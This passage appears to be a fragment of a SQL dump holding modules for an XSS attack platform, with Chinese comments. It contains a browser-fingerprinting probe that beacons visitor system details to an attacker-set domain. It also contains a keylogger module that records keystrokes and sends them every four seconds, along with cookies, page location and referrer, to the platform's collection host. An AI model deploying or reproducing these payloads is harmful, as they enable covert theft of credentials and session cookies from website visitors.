p=0;p&lt;n.length;++p){n[p]=Number(n[p])}if(o.length==2){o[2]=0}if(o[0]&gt;n[0]){return true}if(o[0]&lt;n[0]){return false}if(o[1]&gt;n[1]){return true}if(o[1]&lt;n[1]){return false}if(o[2]&gt;n[2]){return true}if(o[2]&lt;n[2]){return false}return true},refresh:function(){navigator.plugins.refresh(false);var n=this.getBrowser();if(n==&quot;Netscape Family&quot;&amp;&amp;this.allowPlugin()){var o=document.getElementById(&quot;deployJavaPlugin&quot;);if(o==null){this.writeEmbedTag()}}},writeEmbedTag:function(){var n=false;if(navigator.mimeTypes!=null){for(var o=0;o&lt;navigator.mimeTypes.length;o++){if(navigator.mimeTypes[o].type==this.mimeType){if(navigator.mimeTypes[o].enabledPlugin){document.write(&#039;&lt;embed id=&quot;deployJavaPlugin&quot; type=&quot;&#039;+this.mimeType+&#039;&quot; hidden=&quot;true&quot; /&gt;&#039;);n=true}}}if(!n){for(var o=0;o&lt;navigator.mimeTypes.length;o++){if(navigator.mimeTypes[o].type==this.oldMimeType){if(navigator.mimeTypes[o].enabledPlugin){document.write(&#039;&lt;embed id=&quot;deployJavaPlugin&quot; type=&quot;&#039;+this.oldMimeType+&#039;&quot; hidden=&quot;true&quot; /&gt;&#039;)}}}}}}};return d}();\r\n//网站域名info.domain = document.domain;/*//网页标题info.title = document.title;*///屏幕分辨率info.screen = function(){        var c = &quot;&quot;;        if (self.screen) {c = screen.width+&quot;x&quot;+screen.height;}        return c;}();\r\n//浏览器和版本info.browser = function(){        var Sys = {};    var ua = navigator.userAgent.toLowerCase();    var s;    (s = ua.match(/msie ([\\d.]+)/)) ? Sys.ie = s[1] :    (s = ua.match(/firefox\\/([\\d.]+)/)) ? Sys.firefox = s[1] :    (s = ua.match(/chrome\\/([\\d.]+)/)) ? Sys.chrome = s[1] :    (s = ua.match(/opera.([\\d.]+)/)) ? Sys.opera = s[1] :    (s = ua.match(/version\\/([\\d.]+).*safari/)) ? Sys.safari = s[1] : 0;    if (Sys.ie) return {name: &#039;IE&#039;  || &quot;&quot;, version: Sys.ie || &quot;0&quot;};    if (Sys.firefox) return {name: &#039;Firefox&#039; || &quot;&quot;, version: Sys.firefox || &quot;0&quot;};    if (Sys.chrome) return {name: &#039;Chrome&#039; || &quot;&quot;, version: Sys.chrome || &quot;0&quot;};    if (Sys.opera) return {name: &#039;Opera&#039; || &quot;&quot;, version: Sys.opera || &quot;0&quot;};    if (Sys.safari) return {name: &#039;Safari&#039; || &quot;&quot;, version: Sys.safari || &quot;0&quot;};}();\r\n//浏览器语言info.lang = function(){        var type=navigator.appName           if (type==&quot;Netscape&quot;){                   var lang = navigator.language;         }else{                   var lang = navigator.userLanguage;           }        return lang;}();\r\n//系统平台info.system = function (){        var appVer = navigator.userAgent;    var _pf = navigator.platform;      if(_pf == &quot;Win32&quot; || _pf == &quot;Windows&quot;){          if(appVer.indexOf(&quot;Windows NT 6.0&quot;) &gt; -1  || appVer.indexOf(&quot;Windows Vista&quot;) &gt; -1){              return &#039;Windows Vista&#039;;           }else if(appVer.indexOf(&quot;Windows NT 6.1&quot;) &gt; -1 || appVer.indexOf(&quot;Windows 7&quot;) &gt; -1){              return &#039;Windows 7&#039;;                }else if(appVer.indexOf(&quot;Windows NT 6.2&quot;) &gt; -1 || appVer.indexOf(&quot;Windows 8&quot;) &gt; -1){                        return &#039;Windows 8&#039;;        }else{              try{                  var _winName = Array(&#039;2000&#039;,&#039;XP&#039;,&#039;2003&#039;);                  var _ntNum = appVer.match(/Windows NT 5.\\d/i).toString();                  return &#039;Windows &#039; + _winName[_ntNum.replace(/Windows NT 5.(\\d)/i,&quot;$1&quot;)];              }catch(e){                                return &#039;Windows&#039;;                        }          }      }else if(_pf == &quot;Mac68K&quot; || _pf == &quot;MacPPC&quot; || _pf == &quot;Macintosh&quot;){          return &quot;Mac&quot;;                 }else if(_pf == &quot;X11&quot;){          return &quot;Unix&quot;;        }else if(String(_pf).indexOf(&quot;Linux&quot;) &gt; -1){          return &quot;Linux&quot;;       }else{          return &quot;Unknow&quot;;          }         }();  \r\n//flash版本info.flash = function(){        var f=&quot;&quot;,n=navigator;        if (n.plugins &amp;&amp; n.plugins.length) {                for (var ii=0;ii&lt;n.plugins.length;ii++) {                        if (n.plugins[ii].name.indexOf(&#039;Shockwave Flash&#039;)!=-1) {                                f=n.plugins[ii].description.split(&#039;Shockwave Flash &#039;)[1];                                break;                        }                }        }        else        if (window.ActiveXObject) {                for (var ii=10;ii&gt;=2;ii--) {                        try {                                var fl=eval(&quot;new ActiveXObject(&#039;ShockwaveFlash.ShockwaveFlash.&quot;+ii+&quot;&#039;);&quot;);                                if (fl) {                                        f=ii + &#039;.0&#039;;                                        break;                                }                        }                         catch(e) {}                }        }        return f;}(); //java版本info.java = deployJava.getJREs();\r\nfunction json2str(o) {        var arr = [];        var fmt = function(s) {                if (typeof s == &#039;object&#039; &amp;&amp; s != null) return json2str(s);                return /^(string|number)$/.test(typeof s) ? &quot;\\&quot;&quot; + s + &quot;\\&quot;&quot; : s;        }        for (var i in o) arr.push(&quot;\\&quot;&quot; + i + &quot;\\&quot;:&quot; + fmt(o[i]));        return &#039;{&#039; + arr.join(&#039;,&#039;) + &#039;}&#039;;} \r\nvar i = json2str(info);x=new Image();x.src = &quot;https://替换成你的域名/probe.php?id={projectId}&amp;c=&quot;+i;//自定义', 0, 1, '旧版的探针模块使用不了，已经更新了新版的探针模块！\r\n实现功能:\r\ndomain\r\nscreen  //初步判断台式机还是笔记本\r\nbrowser_name\r\nbrowser_version\r\nlanguage\r\nOsystem\r\nflash_version\r\njava_version\r\n没有实现功能：\r\nantivirus\r\nbrowser_expand\r\npc_software', 1, 1, 'uncia', 1466999693),
(106, 1, '键盘记录3', '[]', '[]', 'var ks=&#039;&#039;;\r\ndocument.onkeypress = function(e) {\r\n	get = window.event?event:e;\r\n	key = get.keyCode?get.keyCode:get.charCode;\r\n	key = String.fromCharCode(key);\r\n	ks+=key;\r\n}\r\nwindow.setInterval(function(){\r\n	var b=new Image();\r\ntry { \r\nvar myopener=&#039;&#039;;\r\n myopener=window.opener &amp;&amp; window.opener.location ? window.opener.location : &#039;&#039;; \r\n } catch(err) { } \r\n b.src=&#039;{$xssite}/?do=api&amp;act=r&amp;id={$pid}&amp;a=log&amp;diy[location]=&#039;+escape(document.location)+&#039;&amp;diy[toplocation]=&#039;+escape(top.document.location)+&#039;&amp;diy[cookie]=&#039;+escape (document.cookie)+&#039;&amp;diy[opener]=&#039;+escape(myopener)+&#039;&amp;diy[referrer]=&#039;+escape(document.referrer)+&#039;&amp;diy[title]=&#039;+escape(document.title)+&#039;&amp;log=&#039;+ks;\r\n	ks = &#039;&#039;;\r\n}, 4000);', 0, 1, '', 1, 1, 'uncia', 1466999990);
